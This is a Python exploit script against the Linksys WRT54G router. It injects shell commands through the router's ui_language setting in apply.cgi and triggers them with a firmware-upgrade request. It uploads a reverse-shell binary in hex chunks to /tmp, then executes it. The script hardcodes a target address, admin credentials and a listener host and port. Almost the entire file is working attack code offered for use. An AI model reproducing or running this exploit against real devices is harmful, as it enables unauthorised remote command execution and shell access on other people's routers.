from dataclasses import dataclass
from typing import Tuple

import requests

import router_requests


def hex_str(_bytes):
    res = ''
    for b in _bytes:
        res += f'\\x%02x' % b
    return res


@dataclass
class Router:
    host: str
    creds: Tuple[str, str]

    DEFAULT_LANG = 'en'

    def exploit(self, rev_shell_host: str, rev_shell_port: int):
        print(f'[*] Exploiting Linksys WRT54G @ {self.host}')
        revshell_bin = self._get_revshell_bin()
        index = 0
        self._run_cmd(f'rm /tmp/revshell')
        while index < len(revshell_bin):
            print(f'[*] Progress bar ({index}/{len(revshell_bin)})')
            self._run_cmd(f'echo -ne "{hex_str(revshell_bin[index:index+1500])}" >> /tmp/revshell')
            index += 1500
        self._run_cmd(f'chmod +x /tmp/revshell; /tmp/revshell')
        self._set_ui_language(self.DEFAULT_LANG)

    def _run_cmd(self, cmd):
        self._set_ui_language(f';{cmd};')
        self._upgrade_firmware()

    def _get_revshell_bin(self):
        with open('revshell', 'rb') as revshell_file:
            return revshell_file.read()

    def _set_ui_language(self, ui_language: str):
        print(f'[*] Setting the ui_language to: {ui_language}')
        req_query = router_requests.get_ui_language_query(ui_language)
        req = requests.post(f'http://{self.host}/apply.cgi', data=req_query, auth=self.creds)
        if not req.ok:
            raise ValueError(f'Failed to change ui_language. Request: {req}')

    def _upgrade_firmware(self):
        print(f'[*] Issuing a firmware upgrade.')
        req_query = router_requests.get_upgrade_query()
        req = requests.post(f'http://{self.host}/upgrade.cgi', data=req_query, auth=self.creds)
        if not req.ok:
            raise ValueError(f'Failed to issue a firmware upgrade. Request: {req}')


def main():
    router = Router('192.169.1.1', ('admin', '$kurt'))
    router.exploit('192.169.1.100', 4141)


if __name__ == '__main__':
    main()
